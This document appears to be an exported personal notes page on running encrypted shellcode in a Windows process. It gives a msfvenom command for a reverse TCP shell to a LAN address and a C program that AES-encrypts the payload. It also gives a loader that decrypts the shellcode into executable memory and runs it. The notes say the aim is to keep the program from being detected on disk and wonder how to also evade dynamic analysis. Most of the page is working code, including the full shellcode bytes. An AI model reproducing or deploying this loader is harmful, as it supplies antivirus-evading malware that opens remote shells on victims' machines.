<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Write encrypted shellcode into local/remote process' memory</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Shellcode - Write encrypted shellcode into local/remote process&#39; memory</h1></strong><br />Same principle as injecting into local/remote, except that you decrypt after you&#39;ve copied the shellcode into memory.<br /><br /><strong><h2>Observations</h2></strong><br />• Static Analysis<br />   ◇ Because the shellcode is (should be) uniquely encrypted, the .exe won&#39;t get detected as malicious on disk<br />• Heuristic/Dynamic Analysis<br />   ◇ BUT dynamic/heuristics will flag the .exe as malicious after executing because it will see the unencrypted shellcode in memory (I think)<br />      ▪ Solveable by bypassing heuristic/dynamic analysis? e.g. increase program length to prevent analysis, etc.<br /><br /><strong><h2>## Write Encrypted Shellcode into Local Process</h2></strong><br />Generate some shellcode<br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.58.142 LPORT=443 -f c -b &quot;\x00\x0a\x0d&quot;</code><br /><br />Encrypt the shellcode.<br />Could be Python, could be C.<br />Here I&#39;m using <a href="https://github.com/kokke/tiny-AES-c">tiny-AES-c</a>.<br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;string.h&gt;<br /><br />#include&nbsp;&quot;aes.h&quot;<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;AES_ctx&nbsp;ctx;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;uint8_t&nbsp;key[]&nbsp;=&nbsp;&quot;xXOyqtK5t6XdoM1S&quot;;<br />&nbsp;&nbsp;&nbsp;&nbsp;uint8_t&nbsp;iv[]&nbsp;=&nbsp;&quot;ihLC0JGLwWrzxfeo&quot;;<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;msfvenom&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;LHOST=192.168.58.142&nbsp;LPORT=443&nbsp;-f&nbsp;c&nbsp;-b&nbsp;&quot;\x00\x0a\x0d&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;351&nbsp;(iteration=0)<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Payload&nbsp;size:&nbsp;351&nbsp;bytes<br />&nbsp;&nbsp;&nbsp;&nbsp;uint8_t&nbsp;shellcode[]&nbsp;=&nbsp;&quot;\xdb\xcb\xbb\xba\xa6\x47\xc6\xd9\x74\x24\xf4\x58\x33\xc9\xb1&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x52\x83\xe8\xfc\x31\x58\x13\x03\xe2\xb5\xa5\x33\xee\x52\xab&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xbc\x0e\xa3\xcc\x35\xeb\x92\xcc\x22\x78\x84\xfc\x21\x2c\x29&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x76\x67\xc4\xba\xfa\xa0\xeb\x0b\xb0\x96\xc2\x8c\xe9\xeb\x45&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x0f\xf0\x3f\xa5\x2e\x3b\x32\xa4\x77\x26\xbf\xf4\x20\x2c\x12&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xe8\x45\x78\xaf\x83\x16\x6c\xb7\x70\xee\x8f\x96\x27\x64\xd6&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x38\xc6\xa9\x62\x71\xd0\xae\x4f\xcb\x6b\x04\x3b\xca\xbd\x54&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc4\x61\x80\x58\x37\x7b\xc5\x5f\xa8\x0e\x3f\x9c\x55\x09\x84&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xde\x81\x9c\x1e\x78\x41\x06\xfa\x78\x86\xd1\x89\x77\x63\x95&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xd5\x9b\x72\x7a\x6e\xa7\xff\x7d\xa0\x21\xbb\x59\x64\x69\x1f&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc3\x3d\xd7\xce\xfc\x5d\xb8\xaf\x58\x16\x55\xbb\xd0\x75\x32&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x08\xd9\x85\xc2\x06\x6a\xf6\xf0\x89\xc0\x90\xb8\x42\xcf\x67&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xbe\x78\xb7\xf7\x41\x83\xc8\xde\x85\xd7\x98\x48\x2f\x58\x73&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x88\xd0\x8d\xd4\xd8\x7e\x7e\x95\x88\x3e\x2e\x7d\xc2\xb0\x11&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x9d\xed\x1a\x3a\x34\x14\xcd\x85\x61\x2c\x83\x6e\x70\x50\x9a&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xd5\xfd\xb6\xf6\x39\xa8\x61\x6f\xa3\xf1\xf9\x0e\x2c\x2c\x84&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x11\xa6\xc3\x79\xdf\x4f\xa9\x69\x88\xbf\xe4\xd3\x1f\xbf\xd2&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x7b\xc3\x52\xb9\x7b\x8a\x4e\x16\x2c\xdb\xa1\x6f\xb8\xf1\x98&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xd9\xde\x0b\x7c\x21\x5a\xd0\xbd\xac\x63\x95\xfa\x8a\x73\x63&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x02\x97\x27\x3b\x55\x41\x91\xfd\x0f\x23\x4b\x54\xe3\xed\x1b&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x21\xcf\x2d\x5d\x2e\x1a\xd8\x81\x9f\xf3\x9d\xbe\x10\x94\x29&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xc7\x4c\x04\xd5\x12\xd5\x34\x9c\x3e\x7c\xdd\x79\xab\x3c\x80&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x79\x06\x02\xbd\xf9\xa2\xfb\x3a\xe1\xc7\xfe\x07\xa5\x34\x73&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x17\x40\x3a\x20\x18\x41&quot;;<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;shellcode_len&nbsp;=&nbsp;sizeof(shellcode);<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;#&nbsp;encryptor&nbsp;\n&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;%s&nbsp;\n&quot;,&nbsp;key);<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;iv&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;%s&nbsp;\n&quot;,&nbsp;iv);<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;shellcode&nbsp;len&nbsp;=&nbsp;%d&nbsp;\n&quot;,&nbsp;shellcode_len);<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;shellcode&nbsp;=&nbsp;&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;shellcode_len;&nbsp;i++)&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\\x%.2x&quot;,&nbsp;shellcode[i]);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\n&quot;);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;initalise&nbsp;AES&nbsp;&amp;&nbsp;encrypt&nbsp;shellcode<br />&nbsp;&nbsp;&nbsp;&nbsp;AES_init_ctx_iv(&amp;ctx,&nbsp;key,&nbsp;iv);<br />&nbsp;&nbsp;&nbsp;&nbsp;AES_CBC_encrypt_buffer(&amp;ctx,&nbsp;shellcode,&nbsp;shellcode_len);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;encrypted&nbsp;pl&nbsp;=&nbsp;&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;shellcode_len;&nbsp;i++)&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\\x%.2x&quot;,&nbsp;shellcode[i]);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\n&quot;);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;decrypt&nbsp;shellcode<br />&nbsp;&nbsp;&nbsp;&nbsp;AES_init_ctx_iv(&amp;ctx,&nbsp;key,&nbsp;iv);<br />&nbsp;&nbsp;&nbsp;&nbsp;AES_CBC_decrypt_buffer(&amp;ctx,&nbsp;shellcode,&nbsp;shellcode_len);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;decrypted&nbsp;pl&nbsp;=&nbsp;&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;shellcode_len;&nbsp;i++)&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\\x%.2x&quot;,&nbsp;shellcode[i]);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;\n&quot;);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br />Code breakdown:<br />1. <code>VirtuaAlloc</code> - Allocate memory block to store shellcode in<br />2. <code>memcpy</code> - Copy shellcode to allocated memory block<br />3. Decrypt shellcode in memory via whatever encryption method you ran<br />4. <code>((void(*)())pShellcodeBaseAddress)();</code> - Execute shellcode from memory (no idea wtf how)<br /><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&quot;aes.h&quot;<br /><br />int&nbsp;main()<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;AES&nbsp;struct&nbsp;+&nbsp;key&nbsp;+&nbsp;IV&nbsp;for&nbsp;decryption<br />&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;AES_ctx&nbsp;ctx;<br />&nbsp;&nbsp;&nbsp;&nbsp;uint8_t&nbsp;key[]&nbsp;=&nbsp;&quot;aaaaaaaaaaaaaaaa&quot;;<br />&nbsp;&nbsp;&nbsp;&nbsp;uint8_t&nbsp;iv[]&nbsp;=&nbsp;&quot;bbbbbbbbbbbbbbbb&quot;;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;msfvenom&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;LHOST=192.168.58.142&nbsp;LPORT=443&nbsp;-f&nbsp;c&nbsp;-b&nbsp;&quot;\x00\x0a\x0d&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;x86/shikata_ga_nai&nbsp;succeeded&nbsp;with&nbsp;size&nbsp;351&nbsp;(iteration=0)<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Payload&nbsp;size:&nbsp;351&nbsp;bytes<br />&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;encrypted_shellcode[]&nbsp;=&nbsp;&quot;\x6c\x98\x7c\xd3\x75\xc0\x34\x1f\x83\x5c\x56\x94\xb2\x3c\x67\x19\xb6\x03\xf7\x79\x4e\x66\x22\x48\x9e\x27\x69\x3d\x1b\x78\x1e\x1f\xde\xa9\x41\xa0\x5f\xf8\x3b\x81\xda\xe2\x15\x16\xae\x2f\x7a\x17\x07\xe5\x8e\x1c\x29\x2a\x82\x75\x0a\x3d\x54\x79\x6d\xd9\xc8\x25\x31\xee\x08\xbc\x4a\x3e\x9c\x91\x5d\xdb\xe9\x24\x4d\xf9\x99\xe2\x0a\x21\xd5\x65\xfd\xa3\x1c\x50\x14\xed\xe1\xe2\x40\x5f\xde\x98\x6e\x65\xb0\x04\xdc\x2b\xc1\xdc\x77\xf5\xca\xce\xa8\xdc\x71\x96\xb2\x1f\xa3\x35\x78\x89\xa8\xe3\xb8\x8d\x22\x63\xec\x8e\x05\x20\x47\xb2\x94\xe3\xac\x56\x00\x31\x6b\x2e\x93\xef\x3e\x4e\x3e\x31\xe5\xbf\x8b\xed\xc5\xb3\xf1\x17\x32\x41\x10\x9c\x90\x3d\x77\x20\x92\x02\xb2\x49\x8d\xfa\xe8\x9e\xdd\xc9\xff\x78\x94\x8f\xff\x25\x08\xcc\x06\x54\x42\xb8\x8e\x1b\xc4\xdd\xa2\x1a\xd9\x70\xff\x5a\x2b\x72\x37\x11\x33\xb9\xb0\xa4\xb5\x08\x8e\xbc\x45\x99\xab\x19\x4e\x13\xdd\x61\x04\x29\x60\x5e\x5b\x8e\xe1\x25\xae\xd3\x1e\x3a\x84\x7a\x45\x29\x54\x72\x10\x03\x61\xc7\xa8\x8a\x08\x29\x85\x95\x06\x04\xf2\x31\x8f\xa3\x9a\xb7\xa0\xdf\x99\xf2\x20\x91\x23\xac\x89\x31\xde\xd9\xbb\x4e\xb3\x36\x53\x65\xd5\xa1\x9b\x7c\xb3\x70\x30\x37\x4f\x68\x18\x67\xbc\x6e\xf9\x3e\xfe\xda\x1b\x2c\xa4\x64\xdf\xb0\xdd\xab\x5d\xf0\x89\x85\x8b\x74\x4e\x39\xab\x4a\x57\x1b\x38\x2d\xb7\xdd\x27\x8c\x93\x3a\x2a\x01\x28\x80\x63\xee\x02\x64\x1a\x52\xad\xc4\x18\x85\x70\xd5\xd3\x66\x06\xac\xe5\xce\x2c\xd0\x55\xfa\x27\xaf\x07\x3d\xc2\x9f\x0a\x93\x0a\x6e\x5a\x2c\x4b&quot;;<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;allocate&nbsp;memory&nbsp;for&nbsp;encrypted&nbsp;shellcode<br />&nbsp;&nbsp;&nbsp;&nbsp;void&nbsp;*pEncryptedShellcodeBaseAddress&nbsp;=&nbsp;VirtualAlloc(0,&nbsp;sizeof(encrypted_shellcode),&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;copy&nbsp;encrypted&nbsp;shellcode&nbsp;into&nbsp;memory<br />&nbsp;&nbsp;&nbsp;&nbsp;memcpy(pEncryptedShellcodeBaseAddress,&nbsp;encrypted_shellcode,&nbsp;sizeof(encrypted_shellcode));<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;decrypt&nbsp;shellcode&nbsp;in&nbsp;memory<br />&nbsp;&nbsp;&nbsp;&nbsp;AES_init_ctx_iv(&amp;ctx,&nbsp;key,&nbsp;iv);<br />&nbsp;&nbsp;&nbsp;&nbsp;AES_CBC_decrypt_buffer(&amp;ctx,&nbsp;pEncryptedShellcodeBaseAddress,&nbsp;sizeof(encrypted_shellcode));<br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;execute&nbsp;shellcode&nbsp;from&nbsp;memory<br />&nbsp;&nbsp;&nbsp;&nbsp;((void(*)())pEncryptedShellcodeBaseAddress)();<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div></div>
</body>
</html>
